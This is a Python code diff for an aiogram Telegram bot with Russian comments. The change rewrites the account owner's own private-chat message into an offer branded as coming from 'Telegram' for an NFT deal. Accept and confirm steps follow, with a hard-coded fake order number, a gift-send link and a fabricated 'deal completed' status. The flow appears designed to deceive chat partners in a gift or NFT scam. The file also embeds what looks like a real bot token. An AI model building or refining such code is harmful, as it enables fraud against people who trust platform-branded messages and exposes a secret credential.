@@ -4,7 +4,6 @@ import re
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
-# --- НАСТРОЙКИ ---
 BOT_TOKEN = "9293560168:AAGOXd4Ekj0_vJaiJYC3T2_7TflryEVaD4c"
 
 # ID премиум-эмодзи
@@ -19,7 +18,6 @@ CROSS = f'<tg-emoji emoji-id="{EMOJI_CROSS}">❌</tg-emoji>'
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# --- СЛОВАРИ ЛОКАЛИЗАЦИИ ---
 TEXTS = {
     "ru": {
         "title": "Сделка с NFT",
@@ -67,9 +65,10 @@ TEXTS = {
     }
 }
 
-# --- ОБРАБОТЧИК КОМАНДЫ buy ---
-@dp.message(F.text.regexp(r"^buy\s+(https?://\S+)\s+(\d+(?:\.\d+)?)\s+(stars|gram)\s+(ru|en|ar|zh)$", flags=re.IGNORECASE))
-async def handle_buy_command(message: types.Message):
+# --- ОБРАБОТЧИК КОМАНДЫ buy В БИЗНЕС-ЧАТЕ ---
+# Срабатывает на сообщения, отправленные ВЛАДЕЛЬЦЕМ аккаунта
+@dp.business_message(F.text.regexp(r"^buy\s+(https?://\S+)\s+(\d+(?:\.\d+)?)\s+(stars|gram)\s+(ru|en|ar|zh)$", flags=re.IGNORECASE))
+async def handle_business_buy(message: types.Message):
     match = message.text.match(r"^buy\s+(https?://\S+)\s+(\d+(?:\.\d+)?)\s+(stars|gram)\s+(ru|en|ar|zh)$")
     
     if not match:
@@ -80,14 +79,13 @@ async def handle_buy_command(message: types.Message):
     currency = match.group(3).lower()
     lang = match.group(4).lower()
 
-    t = TEXTS.get(lang, TEXTS["en"])
+    t = TEXTS.get(lang, TEXTS["ru"])
     nft_name = nft_link.split("/")[-1].replace("-", " #").replace("_", " ")
 
-    # Автоматически берем юзернейм того, кто написал команду
-    # Если юзернейма нет (скрыт), используем ID
-    recipient = message.from_user.username or str(message.from_user.id)
+    # Получатель подарка - собеседник (тот, кому вы пишете в ЛС)
+    recipient = message.chat.username or str(message.chat.id)
 
-    # ЭТАП 1: Предложение
+    # Редактируем ВАШЕ исходное сообщение (требуется разрешение "Edit messages" в настройках бота)
     offer_text = (
         f"<b>Telegram</b>\n"
         f"<b>{nft_name}</b>\n\n"
@@ -97,21 +95,38 @@ async def handle_buy_command(message: types.Message):
     )
 
     builder = InlineKeyboardBuilder()
-    # Передаем recipient в callback_data
-    builder.button(text=f"{CHECK} {t['btn_accept']}", callback_data=f"accept|{nft_link}|{amount}|{currency}|{lang}|{nft_name}|{recipient}")
+    builder.button(text=f"{CHECK} {t['btn_accept']}", callback_data=f"accept|{nft_link}|{amount}|{lang}|{nft_name}|{recipient}")
     builder.button(text=f"{CROSS} {t['btn_decline']}", callback_data="decline")
     builder.adjust(2)
 
-    await message.answer(offer_text, reply_markup=builder.as_markup(), parse_mode="HTML", disable_web_page_preview=True)
+    try:
+        # Редактируем сообщение владельца аккаунта
+        await bot.edit_message_text(
+            chat_id=message.chat.id,
+            message_id=message.message_id,
+            text=offer_text,
+            reply_markup=builder.as_markup(),
+            parse_mode="HTML",
+            disable_web_page_preview=True
+        )
+    except Exception as e:
+        logging.error(f"Ошибка редактирования: {e}")
+        # Если не удалось отредактировать (нет прав), отправляем как новое
+        await bot.send_message(
+            chat_id=message.chat.id,
+            text=offer_text,
+            reply_markup=builder.as_markup(),
+            parse_mode="HTML",
+            disable_web_page_preview=True
+        )
 
 
-# --- ЭТАП 2: НАЖАТИЕ "ПРИНЯТЬ" ---
+# --- ЭТАП 2: ПРИНЯТЬ ---
 @dp.callback_query(F.data.startswith("accept|"))
 async def process_accept(callback: types.CallbackQuery):
-    _, nft_link, amount, currency, lang, nft_name, recipient = callback.data.split("|")
-    t = TEXTS.get(lang, TEXTS["en"])
+    _, nft_link, amount, lang, nft_name, recipient = callback.data.split("|")
+    t = TEXTS.get(lang, TEXTS["ru"])
 
-    # ЭТАП 2: Сделка (текст меняется)
     deal_text = (
         f"<b>{t['title']}</b>\n\n"
         f"Заказ #TG-67654174-0\n\n"
@@ -120,7 +135,7 @@ async def process_accept(callback: types.CallbackQuery):
         f"{t['footer'].format(amount=amount, star=STAR)}"
     )
 
-    # Ссылка на отправку подарка тому, кто вызвал команду
+    # Ссылка на отправку подарка собеседнику
     gift_link = f"tg://send_gift?to={recipient}"
 
     builder = InlineKeyboardBuilder()
@@ -128,18 +143,21 @@ async def process_accept(callback: types.CallbackQuery):
     builder.button(text=t['btn_confirm'], callback_data=f"confirm|{amount}|{lang}|{nft_name}")
     builder.adjust(1)
 
-    # Редактируем сообщение на этап "Сделка"
-    await callback.message.edit_text(deal_text, reply_markup=builder.as_markup(), parse_mode="HTML")
+    try:
+        # Редактируем сообщение на этап "Сделка"
+        await callback.message.edit_text(deal_text, reply_markup=builder.as_markup(), parse_mode="HTML")
+    except Exception as e:
+        logging.error(f"Ошибка редактирования на этапе 2: {e}")
+        
     await callback.answer("Вы приняли предложение.")
 
 
-# --- ЭТАП 3: НАЖАТИЕ "ПОДТВЕРДИТЬ ПЕРЕДАЧУ" ---
+# --- ЭТАП 3: ПОДТВЕРДИТЬ ---
 @dp.callback_query(F.data.startswith("confirm|"))
 async def process_confirm(callback: types.CallbackQuery):
     _, amount, lang, nft_name = callback.data.split("|")
-    t = TEXTS.get(lang, TEXTS["en"])
+    t = TEXTS.get(lang, TEXTS["ru"])
 
-    # ЭТАП 3: Финальный текст
     final_text = (
         f"<b>{t['title']}</b>\n\n"
         f"{CHECK} {t['status_done']}\n\n"
@@ -151,19 +169,25 @@ async def process_confirm(callback: types.CallbackQuery):
     builder.button(text=f"{CHECK} Готово", callback_data="noop")
     builder.adjust(1)
 
-    # Редактируем сообщение на финальный этап
-    await callback.message.edit_text(final_text, reply_markup=builder.as_markup(), parse_mode="HTML")
+    try:
+        # Редактируем на финальный этап
+        await callback.message.edit_text(final_text, reply_markup=builder.as_markup(), parse_mode="HTML")
+    except Exception as e:
+        logging.error(f"Ошибка редактирования на этапе 3: {e}")
+
     await callback.answer("Сделка завершена!")
 
 
-# --- ОБРАБОТЧИК НАЖАТИЯ "ОТКЛОНИТЬ" ---
+# --- ОТКЛОНИТЬ ---
 @dp.callback_query(F.data == "decline")
 async def process_decline(callback: types.CallbackQuery):
-    await callback.message.edit_text(f"{CROSS} Вы отклонили предложение.", parse_mode="HTML")
+    try:
+        await callback.message.edit_text(f"{CROSS} Вы отклонили предложение.", parse_mode="HTML")
+    except Exception as e:
+        logging.error(f"Ошибка редактирования при отказе: {e}")
     await callback.answer("Предложение отклонено.")
 
 
-# Заглушка для кнопки "Готово"
 @dp.callback_query(F.data == "noop")
 async def process_noop(callback: types.CallbackQuery):
     await callback.answer("Сделка закрыта.")
